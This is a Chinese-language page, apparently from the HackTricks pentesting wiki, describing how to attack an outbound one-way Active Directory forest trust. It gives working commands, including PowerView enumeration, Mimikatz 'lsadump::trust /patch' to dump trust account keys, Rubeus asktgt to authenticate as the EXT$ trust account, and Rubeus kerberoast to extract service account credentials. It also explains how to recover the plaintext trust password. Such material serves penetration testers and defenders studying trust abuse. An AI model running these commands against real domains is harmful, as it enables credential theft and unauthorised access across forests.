# 外部森林域 - 单向（出站）

{{#include ../../banners/hacktricks-training.md}}

在此场景中，**您的域**正在**信任**来自**不同域**的某些**权限**。

## 枚举

### 出站信任
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## 信任账户攻击

当在两个域之间建立信任关系时，存在安全漏洞，这里将两个域分别称为域 **A** 和域 **B**，其中域 **B** 将其信任扩展到域 **A**。在这种设置中，在域 **A** 中为域 **B** 创建了一个特殊账户，该账户在两个域之间的身份验证过程中发挥着关键作用。与域 **B** 关联的此账户用于加密访问跨域服务的票证。

这里需要理解的关键点是，可以使用命令行工具从域 **A** 的域控制器中提取此特殊账户的密码和哈希值。执行此操作的命令是：
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
此提取之所以可能，是因为该账户在其名称后带有 **$**，处于活动状态，并且属于域 **A** 的“域用户”组，从而继承了与该组相关的权限。这使得个人能够使用该账户的凭据对域 **A** 进行身份验证。

**警告：** 利用这种情况在域 **A** 中作为用户获得立足点是可行的，尽管权限有限。然而，这种访问足以对域 **A** 进行枚举。

在 `ext.local` 是信任域而 `root.local` 是被信任域的场景中，将在 `root.local` 中创建一个名为 `EXT$` 的用户账户。通过特定工具，可以转储 Kerberos 信任密钥，从而揭示 `root.local` 中 `EXT$` 的凭据。实现此目的的命令是：
```bash
lsadump::trust /patch
```
接下来，可以使用提取的 RC4 密钥通过另一个工具命令以 `root.local\EXT$` 身份在 `root.local` 中进行身份验证：
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
此身份验证步骤打开了枚举甚至利用 `root.local` 中服务的可能性，例如执行 Kerberoast 攻击以提取服务帐户凭据，使用：
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### 收集明文信任密码

在之前的流程中，使用了信任哈希而不是 **明文密码**（该密码也被 **mimikatz** 导出）。

明文密码可以通过将 mimikatz 的 \[ CLEAR ] 输出从十六进制转换并去除空字节 ‘\x00’ 来获得：

![](<../../images/image (938).png>)

有时在创建信任关系时，用户必须输入信任的密码。在这个演示中，密钥是原始信任密码，因此是人类可读的。随着密钥的循环（30 天），明文将不再是人类可读的，但在技术上仍然可用。

明文密码可以用来作为信任账户执行常规身份验证，作为请求信任账户的 Kerberos 秘钥的 TGT 的替代方案。在这里，从 ext.local 查询 root.local 的 Domain Admins 成员：

![](<../../images/image (792).png>)

## 参考文献

- [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{{#include ../../banners/hacktricks-training.md}}
